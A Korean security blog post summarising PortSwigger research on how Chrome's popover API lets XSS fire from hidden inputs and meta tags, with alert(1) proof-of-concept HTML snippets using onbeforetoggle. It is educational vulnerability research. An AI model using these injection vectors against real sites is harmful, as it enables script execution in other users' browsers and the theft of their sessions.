---
layout: post
title: "히든(hidden) 필드와 Meta태그에서 XSS가 가능한지 확인하기"
categories: [보안취약점, XSS]
tags: [보안취약점, XSS]
toc: true
last_modified_at: 2023-08-24 11:15:00 +0900
---


# 개요
- 2023년 7월에 적힌 Gareth Heyes씨의 [기술 블로그](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)를 보고 정리한 글이다. 
- 해당 블로그에 의하면 HTML의 히든필드와 메타태그에서도 XSS가 가능하다고 한다. 
- 본래 히든 필드는 웹 이벤트가 거의 발생하지 않기 때문에 XSS가 어렵다고 알려져 있다. 
- 이 배경에는 Chrome이 발표한 신기술(popover API)가 있다고 한다. 
- 이 API를 사용하면 기존의 HTML 모달창 대신에 다음과 같은 창이 표시된다고 한다. 

![크롬 popover창 샘플](/images/chrome-popover-example.png)

- 일단 popover API에 대해 살펴보고 실제로 popover때문에 XSS가 발생할 여지가 늘어났는지 확인해보자. 


# Popover API
- popover API는 크롬 114버전부터 지원한다고 한다. 114버전은 2023년 5월24일에 출시되었다. 
- 2023년 8월24일 시점의 최신버전은 `Version 116.0.5845.96 (Official Build) (64-bit)`다. 지원하는 버전이다. 
- 

## Popover API 특징 
다음 특징이 있다고 한다. 

- Promotion to the top layer.: Popovers 는 별도의 레이어로 페이지에 표시된다. 따라서 z인덱스를 설정할 필요가 없다. Popovers will appear on a separate layer above the rest of the page, so you don’t have to futz around with z-index.
- Light-dismiss functionality.: popover 영역의 바깥쪽을 클릭하면 popover가 사라진다. Clicking outside of the popover area will close the popover and return focus.
- Default focus management: popover를 여는 것은 다음 탭이 popover로 들어오는 것을 막는다(?) Opening the popover makes the next tab stop inside the popover.
- Accessible keyboard bindings.: esc키를 누르면 popover가 사라진다. Hitting the esc key will close the popover and return focus.
- Accessible component bindings.: popover 엘레먼트를 popover 트리거와 연결한다. Connecting a popover element to a popover trigger semantically.

## Popover API사용법
자바스크립트를 사용하지 않고도 사용할 수 있다고 한다. 기본적인 popover는 다음 세가지가 필요하다. 
1. `popover` 속성: popover를 나타낼 엘레먼트(div등)에 이 속성을 추가한다. 
2. `id` 속성: popover를 나타낼 엘레먼트(div등) 의 id값(value)를 가지고 있어야 한다. 
3. `popovertarget` 속성: popover를 나타내는 이벤트의 Trigger가 되는 엘레먼트(버튼등)에 이 속성을 추가한다. 

```html
<button popovertarget="my-popover"> Open Popover </button>

<div id="my-popover" popover>
  <p>I am a popover with more information.</p>
</div>
```

위의 코드를 실행한 결과는 다음과 같다. 버튼을 누르면 화면에  popover (I am a popover with more information부분) 가 나타난다. 

![샘플실행](/images/chrome-popover-example-sample.png)

# XSS 테스트
## 기본
일단 기본형을 테스트해본다. 코드는 다음과 같다. 

```html
<html>
<body>
<button popovertarget=x> Click me</button>
<xss onbeforetoggle=alert(1) popover id=x>XSS</xss>
</body>
</html>
```

크롬으로 실행해보면 다음과 같이 alert이 실행되는 것을 볼 수 있다. 

![popover-xss-basic](/images/popover-xss-basic.png)

## XSS in hidden input
그러면 이어서 두 번째 형태를 테스트해본다. hidden 타입의 input 엘레먼트에서도 이벤트가 발동해서 XSS가 가능한지 확인해본다. 본래 히든 필드는 웹 이벤트가 거의 발생하지 않기 때문에 XSS가 어렵다고 알려져 있다. 

```html
<html>
<body>
<button popovertarget=x> Click me</button>
<input type="hidden" value="y" popover id=x onbeforetoggle=alert(1)>
</body>
</html>
```

크롬으로 실행해보면 alert이 실행되는 것을 볼 수 있다. 

## XSS in hidden input (ID가 중복된 경우)
ID가 중복되는 경우는 어떻게 될까? 다음 HTML문서내에는 id 속성의 값 `x`를 가진 엘레먼트가 두 개 존재한다. hidden 인풋과 div 엘레먼트가 그 것이다. hidden 인풋쪽은 XSS로 코드가 삽입되었다고 상정한다. 이 문서를 실행하면 원래있던 div 엘레먼트를 우선하여 popover가 실행될까? 아니면 인젝션된 input 엘레먼트가 우선되어 alert창이 실행될까? chrome에서 테스트해보면 alert창이 실행되는 것을 볼 수 있다. HTML문서 내에서 상위에 위치하기 때문이다. input 필드가 원래 있던 div 보다 하위에 위치하면 div가 우선되어 popover로 나타난다. 

```html
<html>
<body>
<!-- Injection occurs inside a hidden input attribute -->
<input type="hidden" value="y" popover id=x onbeforetoggle=alert(1)>

<!-- Existing popup code -->
<div id=x popover>I'm a popup</div>
<button popovertarget=x> Click me</button>
<!-- End existing code -->

</body>
</html>
```

## XSS in meta tags
popover 속성이 추가됨으로 인해 메타 태그에서도 XSS를 발동시키는게 가능하다. 메타 태그역시 hidden 인풋과 마찬가지로 발생하는 이벤트가 거의 없어 XSS가 발동되는 것이 어렵다고 알려져 있다. 다음 코드로 메타 태그에서도 XSS가 가능한 것을 확인할 수 있다. 
 
```html
<html>
<head>
    <!-- Injection occurs inside meta attribute -->
    <meta name="apple-mobile-web-app-title" content="Twitter" popover id=newsletter onbeforetoggle=alert(1) />
</head>
<body>
    <!-- Existing code-->
    <button popovertarget=newsletter>Subscribe to my newsletter</button>
    <div popover id=newsletter>My newsletter popup</div>
    <!-- End existing code-->
</body>
</html>
```

# 참고 
- https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags
- https://developer.chrome.com/blog/introducing-popover-api/
- https://developer.mozilla.org/ko/docs/Learn/JavaScript/Building_blocks/Events